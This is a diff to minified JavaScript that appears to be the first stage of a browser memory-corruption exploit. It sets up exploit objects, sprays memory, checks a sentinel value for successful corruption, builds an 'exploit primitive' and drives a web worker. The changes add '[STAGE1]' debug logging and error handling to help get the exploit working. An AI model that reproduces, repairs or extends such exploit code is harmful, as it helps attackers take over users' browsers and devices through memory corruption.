@@ -152,7 +152,11 @@ async function q(t, e) {
     return t & rt(it);
   }
   const ct = async () => {
-    const t = new ut();
+    try {
+      if (typeof self !== 'undefined') {
+        try { self.postMessage({ type: 0, msg: "ct() started in worker" }); } catch(e) {}
+      }
+      const t = new ut();
     const e = true;
     const n = false;
     const s = true;
@@ -1059,6 +1063,9 @@ async function q(t, e) {
         type: r
       });else throw t;
     }
+    } catch (ctErr) {
+      try { self.postMessage({ type: 0, msg: "ct() error: " + (ctErr && ctErr.message) }); } catch(e) {}
+    }
   };
   const ht = async (t) => {
     window.log("[STAGE1] ht() started - setting up exploit objects");
@@ -1080,7 +1087,9 @@ async function q(t, e) {
         } catch (t) {}
       };
       r(0, n);
+      window.log("[STAGE1] u() - spray complete, e[5]=" + e[5] + " (should be 6.6 on success)");
       if (e[5] !== 6.6) {
+        window.log("[STAGE1] u() - corruption check failed, rescheduling spray");
         o("");
         try {
           o("");
@@ -1090,11 +1099,16 @@ async function q(t, e) {
           c.As = c.Oi.Co(e[3]);
           c.Us = c.Oi.Co(e[4]);
           P.platformState.exploitPrimitive = c;
+          window.log("[STAGE1] u() - exploit primitive created and stored!");
           t();
         } catch (t) {
+          window.log("[STAGE1 ERROR] u() - exception in exploit setup: " + (t && t.message));
           o(t);
         }
-      } else window.setTimeout(u, 0);
+      } else {
+        window.log("[STAGE1] u() - memory corruption successful! e[5] is 6.6");
+        window.setTimeout(u, 0);
+      }
     };
     const a = () => {
       window.log("[STAGE1] a() called - creating worker");
@@ -1481,9 +1495,13 @@ async function q(t, e) {
     try {
       try {
         self.postMessage({ type: 0, msg: "worker_started" });
-      } catch (e) {
-        // postMessage might not work immediately
-      }
+      } catch (e) {}
+      
+      // Send ready immediately
+      try {
+        self.postMessage({ type: 0, msg: "worker_ready" });
+      } catch (e) {}
+      
       o("");
       self.onmessage = (t) => {
         try {
@@ -1506,10 +1524,6 @@ async function q(t, e) {
           } catch (e) {}
         }
       };
-      // Signal that worker is ready to receive messages
-      try {
-        self.postMessage({ type: 0, msg: "worker_ready" });
-      } catch (e) {}
     } catch (err) {
       try {
         self.postMessage({ type: 0, msg: "worker_setup_error: " + err.message });
